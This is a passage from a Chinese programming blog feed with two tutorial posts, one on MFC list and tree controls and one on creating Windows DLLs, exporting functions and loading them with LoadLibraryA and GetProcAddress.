class="code"><pre><span class="line">DWORD extStyle = m_list.<span class="built_in">GetExtendedStyle</span>();</span><br><span class="line">extStyle |= LVS_EX_FULLROWSELECT;</span><br><span class="line">extStyle |= LVS_EX_GRIDLINES;</span><br><span class="line">m_list.<span class="built_in">SetExtendedStyle</span>(extStyle);</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/115.png" class=""><p>多了点格子，目前还没有数据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//列增加数据</span></span><br><span class="line">m_list.<span class="built_in">InsertItem</span>(<span class="number">0</span>, <span class="built_in">CString</span>(<span class="string">&quot;0&quot;</span>));</span><br><span class="line">m_list.<span class="built_in">SetItemText</span>(<span class="number">0</span>, <span class="number">1</span>, _T(<span class="string">&quot;192.168.0.1&quot;</span>));</span><br><span class="line">m_list.<span class="built_in">SetItemText</span>(<span class="number">0</span>, <span class="number">2</span>, _T(<span class="string">&quot;6648964896486480&quot;</span>));</span><br><span class="line">m_list.<span class="built_in">SetItemText</span>(<span class="number">0</span>, <span class="number">3</span>, _T(<span class="string">&quot;999&quot;</span>));</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/116.png" class=""><p>虽然能设置，但是总归是麻烦了一点。</p><p>另外背景颜色。。额没这个本事，用参数调得不得行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m_list.<span class="built_in">SetBkColor</span>(<span class="built_in">RGB</span>(<span class="number">64</span>, <span class="number">255</span>, <span class="number">128</span>));</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/117.png" class=""><p>哈哈哈瞎调的，辣眼睛还是注释了先。</p><p>列表比较实用的也可以像多选那样，在初始化的地方给list加个样式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extStyle |= LVS_EX_CHECKBOXES;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/118.png" class=""><p>可以看到多了多选框</p><p>那么首先要拖个按钮测试选中之后拉取数据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnList</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="type">int</span> lineCount = m_list.<span class="built_in">GetItemCount</span>();</span><br><span class="line">CHeaderCtrl* pHeader = m_list.<span class="built_in">GetHeaderCtrl</span>();</span><br><span class="line"><span class="type">int</span> coloumnCount = pHeader-&gt;<span class="built_in">GetItemCount</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; lineCount; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; coloumnCount; j++) &#123;</span><br><span class="line">CString temp = m_list.<span class="built_in">GetItemText</span>(i, j);</span><br><span class="line"><span class="type">char</span> Text[MAX_PATH];</span><br><span class="line"><span class="built_in">memset</span>(Text, <span class="number">0</span>, <span class="built_in">sizeof</span>(Text));</span><br><span class="line"><span class="type">size_t</span> total;</span><br><span class="line"><span class="built_in">wcstombs_s</span>(&amp;total, Text, <span class="built_in">sizeof</span>(Text), temp, temp.<span class="built_in">GetLength</span>());</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d): %s %s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__, Text);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/119.png" class=""><p>可以看到日志输出了我们所选的行的数据。</p><p>如何把多选框和数据关联<br>显然就是判断</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnList</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="type">int</span> lineCount = m_list.<span class="built_in">GetItemCount</span>();</span><br><span class="line">CHeaderCtrl* pHeader = m_list.<span class="built_in">GetHeaderCtrl</span>();</span><br><span class="line"><span class="type">int</span> coloumnCount = pHeader-&gt;<span class="built_in">GetItemCount</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; lineCount; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (m_list.<span class="built_in">GetCheck</span>(i)) &#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d): %s %s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__, <span class="string">&quot;选中&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d): %s %s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__, <span class="string">&quot;未选中&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; coloumnCount; j++) &#123;</span><br><span class="line">CString temp = m_list.<span class="built_in">GetItemText</span>(i, j);</span><br><span class="line"><span class="type">char</span> Text[MAX_PATH];</span><br><span class="line"><span class="built_in">memset</span>(Text, <span class="number">0</span>, <span class="built_in">sizeof</span>(Text));</span><br><span class="line"><span class="type">size_t</span> total;</span><br><span class="line"><span class="built_in">wcstombs_s</span>(&amp;total, Text, <span class="built_in">sizeof</span>(Text), temp, temp.<span class="built_in">GetLength</span>());</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d): %s %s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__, Text);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/120.png" class=""><p>虽然有点简陋。</p><p>关于list的style <code>LVS_EX_</code>还有很多不怎么用的，不过一般也是重写<br>还有些set的方法可以搜一搜看看。</p><hr><h3 id="Tree"><a href="#Tree" class="headerlink" title="Tree"></a>Tree</h3><img src="/2022/07/25/mfc01/121.png" class=""><p>拖个tree control出来，然后添加个变量<br>且预览效果跟这样差不多，那我们肯定要自己初始化他</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Tree</span></span><br><span class="line">HTREEITEM hRoot = m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;root&quot;</span>));</span><br><span class="line">HTREEITEM hLeaf1 = m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;leaf&quot;</span>), hRoot);</span><br><span class="line">m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;sub&quot;</span>), hLeaf1);</span><br><span class="line">HTREEITEM hLeaf2 = m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;leaf&quot;</span>), hRoot);</span><br><span class="line">m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;sub&quot;</span>), hLeaf2);</span><br></pre></td></tr></table></figure><p>根 叶 子叶</p><img src="/2022/07/25/mfc01/122.png" class=""><p>这是全部展开的样子，默认只有root，双击之后一个个展开。光秃秃的很潦草。</p><p>图标自己画问题不大，右击项目打开所在路径，找到res文件夹，在里面添加个位图</p><img src="/2022/07/25/mfc01/123.png" class=""><p>这是画完的样子。<br>然后导入资源。</p><p><strong>搞这种位图呢，主要是应对需要挺多logo之类简单的图片，文件太散找的麻烦，在一张上做分界标记会更好</strong></p><img src="/2022/07/25/mfc01/124.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//头文件声明</span></span><br><span class="line">CImageList m_icons;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源文件初始化</span></span><br><span class="line">m_icons.<span class="built_in">Create</span>(IDB_TREE, <span class="number">32</span>, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">m_tree.<span class="built_in">SetImageList</span>(&amp;m_icons, TVSIL_NORMAL);</span><br><span class="line"><span class="comment">//Tree</span></span><br><span class="line">HTREEITEM hRoot = m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;root&quot;</span>), <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">HTREEITEM hLeaf1 = m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;leaf&quot;</span>), <span class="number">2</span>, <span class="number">1</span>, hRoot);</span><br><span class="line">m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;sub&quot;</span>), <span class="number">2</span>, <span class="number">1</span>, hLeaf1);</span><br><span class="line">HTREEITEM hLeaf2 = m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;leaf&quot;</span>), <span class="number">2</span>, <span class="number">1</span>, hRoot);</span><br><span class="line">m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;sub&quot;</span>), <span class="number">2</span>, <span class="number">1</span>, hLeaf2);</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/125.png" class=""><p>哈哈图片画少了，他一个节点两个状态可以用两个图片的，选中和未选中两个样，但是我们用的2和1，所以效果就比较糙。</p><img src="/2022/07/25/mfc01/126.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnNMDblclkTree</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">UINT nCount = m_tree.<span class="built_in">GetSelectedCount</span>();</span><br><span class="line"><span class="keyword">if</span> (nCount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">HTREEITEM hSelect = m_tree.<span class="built_in">GetSelectedItem</span>();</span><br><span class="line">CString strText = m_tree.<span class="built_in">GetItemText</span>(hSelect);</span><br><span class="line"><span class="type">char</span> sText[<span class="number">256</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">size_t</span> total;</span><br><span class="line"><span class="built_in">wcstombs_s</span>(&amp;total, sText, <span class="built_in">sizeof</span>(sText), strText, strText.<span class="built_in">GetLength</span>());</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d): %s %s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__, sText);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*pResult = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/127.png" class=""><p>其实做法有很多，大多例子都是颗糖。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>MFC看下来跟去年Qt一个感觉吧，知道拖控件和消息之类的，但是实战太少，经验不足，有的时候很难主动把这些关联起来。</p><p>至于Qt后面也要重新捯饬捯饬。</p>]]></content>
      
      
      
        <tags>
            
            <tag> MFC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态链接库</title>
      <link href="/2022/07/25/dynamiclink/"/>
      <url>/2022/07/25/dynamiclink/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>动态链接库（Dynamic Link Library 或者 Dynamic-link Library，缩写为 DLL），是微软公司在微软Windows操作系统中，实现共享函数库概念的一种方式。这些库函数的扩展名是 ”.dll”、”.ocx”（包含ActiveX控制的库）或者 “.drv”（旧式的系统驱动程序）。<br>——百度百科</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>与之对应的在基础那会学过静态链接库<code>.lib</code>，要使用特定的功能，就必须加载这个静态库，这样在编译的时候其实exe就包含了这个lib。<br>而现在的动态链接库，他只管调用，不去负责连接的过程，要么你写好了不用，他不发生连接，要么写了要用的时候才会去连接。</p><p>静态库编译完成后，已经和exe合并，所以这个exe会比较大。<br>动态库在内存中连接，并没有本质上的合并，相对而言exe比较小，但是计算机如果缺失这个动态库，那么这个exe基本就废了。</p><p>windows常见的动态库(.dll)</p><ol><li>gdi32.dll    绘图</li><li>user32.dll   用户界面有关的函数</li><li>kernel32.dll 内存、线程、进程</li><li>d3d9x_11.dll 绘图</li></ol><p>动态链接库的意义</p><ul><li>模块化</li><li>方便更新迭代</li><li>提高共享率和利用率</li><li>节约内存</li><li>本地化支持</li><li>跨语言编程</li><li>解决版本问题</li><li>等等诸如此类</li></ul><p>歪瓜的事说不得。能做到动态库的瓜也不是一般人了。</p><p>动态库的问题</p><ul><li>因为动态链接，需要时间</li><li>找不到动态库，exe没法跑</li><li>因为更新而导致接口或者参数不一样了，那么以前的代码全废了</li></ul><hr><h2 id="创建动态库"><a href="#创建动态库" class="headerlink" title="创建动态库"></a>创建动态库</h2><img src="/2022/07/25/dynamiclink/000.png" class=""><img src="/2022/07/25/dynamiclink/001.png" class=""><p>vs有模板，直接创建动态链接库的项目就行了。<br>当然是因为第一次，后面自己想怎么来也无所谓。</p><p>其中pch.h 和 pch.cpp是用来预编译的。核心文件自然就是dllmain.cpp。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">   DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">   LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dllmain就是这个程序的主入口。</p><p>我们自定义一个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//前缀试了让编译器导出这个函数 _d</span></span><br><span class="line"><span class="comment">//由于是c++环境，编译的函数，因为有重载，所以会带有很多参数</span></span><br><span class="line"><span class="comment">//我们可以让他用c语言风格编译</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实要考虑东西比较多。<br>如果定义这块写成这样很麻烦，可以新建一个头文件，把声明写好，这样定义写起来至少看着正常点。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br></pre></td></tr></table></figure><p>不过实际用途上，这个头文件还是为了让用你的库的人用的。</p><p>还有一种解决办法</p><img src="/2022/07/25/dynamiclink/002.png" class=""><p>模块化文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LIBRARY</span><br><span class="line"></span><br><span class="line">EXPORTS</span><br><span class="line">ave</span><br></pre></td></tr></table></figure><p>这么写之后，就不用头文件了。</p><p>上述情况中，我们先忽视了c++的函数重载。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ave</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一种解决办法就是提前给链接器做好准备<br><code>#pragma comment(linker,&quot;/export:ave=?ave@@YAHHH@Z&quot;)</code><br>只不过这种写法还不如模块化文件，而且不确定会不会有问题</p><p>还有一种比较麻烦的就是还带了函数调用约定</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1为调用风格   2为导出   3为调用约定</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">int</span> _stdcall <span class="title">ave</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_stdcall在windows api中倒是常见。不过函数在编译后就不会是单纯ave了。<br>要指定的话<code>#pragma comment(linker,&quot;/export:ave=_ave@4&quot;)</code><br>当然显得也有些奇怪</p><img src="/2022/07/25/dynamiclink/003.png" class=""><p>模块化文件之所以能够直接用，其实编译器做了处理的</p><p>简单回顾几种</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/export:ave=_ave@4&quot;</span>)</span></span><br><span class="line"><span class="comment">//.....</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ave_1</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> _stdcall <span class="title">ave</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + a;</span><br><span class="line">&#125;</span><br><span class="line">_declspec(dllexport) <span class="function"><span class="type">int</span> _stdcall <span class="title">ave_2</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + a) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//模块化文件</span></span><br><span class="line">LIBRARY</span><br><span class="line"></span><br><span class="line">EXPORTS</span><br><span class="line">ave_1</span><br></pre></td></tr></table></figure><p>因为懒得下拆解dll函数的软件，就纯yy了。</p><p>一种通过链接器提前导，一种在代码里导出，一种就是模块化文件导出</p><blockquote><p>dll除了导出函数，还能导出变量</p></blockquote><hr><h2 id="链接动态库"><a href="#链接动态库" class="headerlink" title="链接动态库"></a>链接动态库</h2><p>首先新建项目，这会空项目问题不大，然后可以放到一个解决方案下。</p><p>右击新建的项目，找到生成项目依赖项，选择</p><img src="/2022/07/25/dynamiclink/004.png" class=""><p>打上勾。</p><p>然后新建项目里自然要去调用了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//加载dll</span></span><br><span class="line">HMODULE hMod = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;myDll.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hMod)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;模块加载成功!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注：此处loaddll的时候，只写了文件名是因为两个项目在一个解决方案里面，所以生成的exe和dll也在一个文件夹，就不用这么麻烦写路径</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//加载dll</span></span><br><span class="line">HMODULE hMod = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;myDll.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hMod)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;模块加载成功!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">FARPROC func = <span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;ave_1&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (func)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;函数加载成功!\n&quot;</span>;</span><br><span class="line"><span class="built_in">func</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>typedef int (FAR WINAPI *FARPROC)();</code>类似于函数指针。</p><img src="/2022/07/25/dynamiclink/005.png" class=""><p>发现函数输出乱值，其实也不难猜到，因为没有输入参数，但是它又不报错。</p><p>这种情况不报错其实不太好，那么FARPROC是函数指针，我们也可以自己定义一个</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*FAVE_1)</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/dynamiclink/006.png" class=""><p>这样他就会提示要输入参数了。</p><p>然后随便输入俩</p><img src="/2022/07/25/dynamiclink/007.png" class=""><p>这样就成功了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*FAVE_1)</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//加载dll</span></span><br><span class="line">HMODULE hMod = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;myDll.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hMod)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;模块加载成功!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">FAVE_1 func = (FAVE_1)<span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;ave_1&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (func)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;函数加载成功!\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">func</span>(<span class="number">200</span>,<span class="number">300</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>HMODULE hMod = LoadLibraryA(&quot;myDll.dll&quot;);</code>这一步就是程序跑的时候，把这个库加载到程序的内存中。</p><p><code>FAVE_1 func = (FAVE_1)GetProcAddress(hMod, &quot;ave_1&quot;);</code>这一步是为了把函数的地址取出来，用了自定义类型是因为原本的类型不符合我们的需求。<strong>同时要注意，如果dll没有导出这个函数，那么根据这个函数名是找不到的</strong></p><p>如果不想用这个dll了，就可以使用<code>FreeLibrary(hMod);</code></p><p>再往后，如果我们想调用这个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> _stdcall <span class="title">ave</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + a;</span><br><span 